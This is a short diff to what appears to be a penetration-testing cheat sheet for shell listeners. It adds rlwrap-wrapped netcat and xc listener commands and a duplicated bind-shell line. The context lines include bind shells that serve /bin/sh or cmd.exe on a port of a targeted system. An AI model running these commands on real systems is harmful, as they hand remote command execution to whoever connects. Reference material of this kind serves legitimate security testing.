@@ -211,6 +211,7 @@ Options: /c <COMMAND>
 # Linux
 # If nc's "-e" option is available on the targeted system:
 nc [-4] -lvnp <PORT> -e /bin/sh &
+nc [-4] -lvnp <PORT> -e /bin/sh &
 
 # Windows
 # The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
@@ -227,9 +228,11 @@ nc64.exe -lvnp <PORT> -e cmd.exe
 ```
 # TCP
 nc -lvnp <PORT>
+rlwrap nc -lvnp <PORT>
 
 # UDP
 nc -lvnpu <PORT>
+rlwrap nc -lvnpu <PORT>
 
 # With SSL / TLS support
 ncat --ssl -vv -l -p <PORT>
@@ -249,6 +252,7 @@ powercat -l -p 443 -e <BINARY>
 
 ```
 xc -l -p <PORT>
+rlwrap xc -l -p <PORT>
 
 xc.exe -l -p <PORT>
 ```
